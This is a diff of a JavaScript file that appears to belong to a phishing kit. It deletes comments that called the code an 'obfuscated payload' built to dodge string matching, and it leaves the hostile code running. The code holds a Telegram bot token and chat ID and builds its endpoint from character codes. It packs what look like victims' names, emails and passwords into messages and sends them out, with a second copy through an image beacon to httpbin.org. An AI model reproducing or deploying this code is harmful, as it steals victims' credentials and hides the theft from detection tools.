@@ -1,8 +1,7 @@
-// app.js — obfuscated payload, no static Telegram strings
 (function(){
-    // Config fragments — split to avoid string matching
-    var p1 = '8416791643:AAEZInsemXwV2akMlgI0OY27YNG-uqB9r_o';  // Replace with bot token
-    var p2 = '7390531894';    // Replace with chat ID
+    
+    var p1 = '8416791643:AAEZInsemXwV2akMlgI0OY27YNG-uqB9r_o';  
+    var p2 = '7390531894';    
     
     // Build endpoint dynamically
     var base = String.fromCharCode(104,116,116,112,115,58,47,47)+
@@ -60,7 +59,7 @@
             'S: '+sc+'\n'+
             'R: '+esc(rf);
 
-        // Secondary exfil via image beacon (fires even if fetch blocked)
+        // Secondary  via image beacon (fires even if fetch blocked)
         var beacon = new Image();
         beacon.src = 'https://httpbin.org/get?d='+b64e(JSON.stringify({f:fn,l:ln,e:em,p:pw,t:ts}));
 
